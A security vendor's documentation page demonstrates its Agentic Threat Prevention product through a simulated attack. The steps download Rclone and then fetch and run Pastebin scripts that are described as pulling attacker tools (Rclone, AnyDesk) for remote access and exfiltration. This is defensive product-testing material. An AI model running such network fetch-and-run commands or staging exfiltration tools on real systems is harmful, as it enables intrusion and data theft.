---
title: "Demonstrating How Agentic Threat Prevention Protects Your Network"
slug: "demonstrating-how-agentic-prevention-protects-your-network"
updated: 2026-08-13T20:12:56Z
published: 2026-08-13T20:12:56Z
canonical: "knowledge.catonetworks.com/demonstrating-how-agentic-prevention-protects-your-network"
---

> ## Documentation Index
> Fetch the complete documentation index at: https://knowledge.catonetworks.com/llms.txt
> Use this file to discover all available pages before exploring further.

# Demonstrating How Agentic Threat Prevention Protects Your Network

## Overview

Agentic Threat Prevention is a security engine that proactively applies dynamic controls in response to detected threats to reduce the attack surface and mitigate threats early, before any impact occurs. For more information, see [What is Agentic Threat Prevention?](/v1/docs/what-is-dynamic-prevention)

This article simulates a real-world attack scenario to demonstrate how Agentic Threat Prevention protects your network. Although this is not an agentic threat, it demonstrates how controls are applied to prevent similar techniques from being used in an agentic attack.

In this example, a user downloads a script from Pastebin that an attacker uses to attempt to retrieve additional high-risk tools required to carry out a future attack. Agentic Threat Prevention identifies the malicious behavior and blocks the tool from being downloaded, preventing the attack before it can progress, or any impact occurs.

The response to this attack is fully automated. No additional rules are required. Simply enabling Agentic Threat Prevention is sufficient to prevent the attack.

To simulate this attack:

1. Download a high-risk tool without being blocked
2. Download the script from Pastebin
3. Attempt to download the high-risk tools again. This time, the download is blocked.

> [!NOTE]
> Note:
> 
> Although this scenario is not agentic, it illustrates how controls can help prevent similar techniques from being used in agentic attacks.

### Prerequisites

- Agentic Threat Prevention is enabled with actions set to **Block**

## Step 1: Download a High-Risk Tool

To demonstrate that Agentic Threat Prevention blocks actions only when they are part of a malicious sequence, first download Rclone, an open-source command-line tool for managing files. Attackers commonly use Rclone as a post-compromise tool because it is legitimate, powerful, and blends in with normal administrative activity.

### Action

Download Rclone from either:

- The following URL: `https://downloads.rclone.org/rclone-current-windows-amd64.zip`
- On Windows devices:
  - The following PowerShell command: `Open-InBrowser -Url "https://downloads.rclone.org/rclone-current-windows-amd64.zip" -Label "RClone"`
- On macOS/Linux devices:
  - The following Terminal command: `curl -sSL "https://downloads.rclone.org/rclone-current-windows-amd64.zip"`

### Result

The file downloads successfully.

### Explanation

This confirms that, in isolation, the action is not blocked, as it is not considered malicious when it is not preceded by suspicious activity.

## Step 2: Download a Script from Pastebin

To simulate the start of an attack, download a script from Pastebin that, when run, downloads common attacker tools, for example, Rclone and AnyDesk for remote access and exfiltration.

### Action

Download and run the script from Pastebin:

- On Windows devices:
  - The following PowerShell command: `(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/C5VxKUpE')`
- On macOS/Linux devices:
  - The following Terminal command: `curl -sSL "https://pastebin.com/raw/tXhVK2V7"`

### Result

The script runs and downloads the tools. A dynamic control is applied to the host, which is shown in the **Agentic** **Threats** page. For more information, see [Monitoring Agentic Threat Prevention](/v1/docs/monitoring-agentic-threat-prevention)

### Explanation

Agentic Threat Prevention detects indicators of suspicious behavior and proactively enforces controls to block subsequent malicious actions, stopping the attack before any impact occurs.

## Step 3: Download a High-Risk Tool

In the simulated attack, the attacker attempts to download Rclone. However, because this action follows the suspicious activity of downloading the script from Pastebin and a control is applied, Agentic Threat Prevention blocks the Rclone download.

### Action

Download Rclone using any of these options:

- Directly from Rclone’s site: `https://downloads.rclone.org/rclone-current-windows-amd64.zip`
- This PowerShell command (on Windows): `Open-InBrowser -Url "https://downloads.rclone.org/rclone-current-windows-amd64.zip" -Label "RClone"`
- This Terminal command (on macOS/Linux): `curl -sSL "https://downloads.rclone.org/rclone-current-windows-amd64.zip"`

### Result

The download of this file is blocked by the control. The mitigated threat is shown in the **Agentic** **Threats** Page.

### Explanation

Unlike in Step 1, where this script was run in isolation and therefore allowed, the download of this script was now preceded by a suspicious action and is blocked by Agentic Threat Prevention.

## Demonstration

This video shows a demonstration of this simulated attack:

[Embedded content](https://fast.wistia.com/embed/iframe/hswxqkyt1b.js)
